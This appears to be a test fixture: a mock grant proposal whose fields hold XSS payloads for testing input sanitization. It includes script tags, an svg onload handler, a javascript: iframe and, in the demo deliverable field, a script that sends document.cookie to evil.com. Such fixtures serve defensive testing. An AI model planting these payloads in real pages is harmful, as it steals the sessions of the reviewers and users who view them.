title: <script>alert('xss')</script> Malicious Proposal Title
description:
This is a seemingly normal proposal description that contains hidden XSS payloads throughout. The attacker embeds tags within otherwise legitimate-looking text to bypass naive sanitization filters. Additionally, event handlers like
hover me
are placed strategically to exfiltrate session data from reviewers.
problemStatement: <svg onload="alert('xss-problem')">The problem is that security is often an afterthought in grant evaluation systems.</svg>
proposedSolution: We propose a solution that <iframe src="javascript:alert('xss-solution')"></iframe> addresses security concerns by implementing proper input validation and output encoding across all user-facing surfaces.
timeline: Week 1-3: Development . Week 4: Testing. Week 5: Deployment.
demoDayDeliverable: A working prototype <script>fetch('https://evil.com/exfil?data='+document.cookie)</script> with full test coverage.
communityContribution: Open-source all code click here and host workshops for the community.
